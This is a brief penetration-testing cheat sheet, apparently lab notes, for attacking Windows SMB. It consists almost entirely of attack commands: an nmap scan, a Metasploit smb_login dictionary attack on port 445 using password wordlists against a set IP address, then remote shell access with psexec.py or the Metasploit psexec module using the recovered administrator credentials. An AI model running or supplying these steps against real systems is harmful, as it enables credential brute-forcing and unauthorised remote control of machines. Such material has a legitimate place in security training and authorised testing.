# Exploiting SMB using Psexec

1. Scan the target for open ports.
```
nmap -sV -sC <TARGET>
```

2. Perform a dictionary attack on Port 445 using `smb_login` Metasploit module

```
use auxiliary/scanner/smb/smb_login
set RHOST 10.5.30.42
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false 
run
```

3. Gain an interactive shell using the obtained credentials via `psexec` tool.

```
psexec.py administrator:password@10.5.30.42
```


#### METASPLOIT ALTERNATIVE:

```
use exploit/windows/smb/psexec   
set RHOST 10.5.30.42
set SMBUSER administrator
set SMBPASS qwertyuiop
run
```

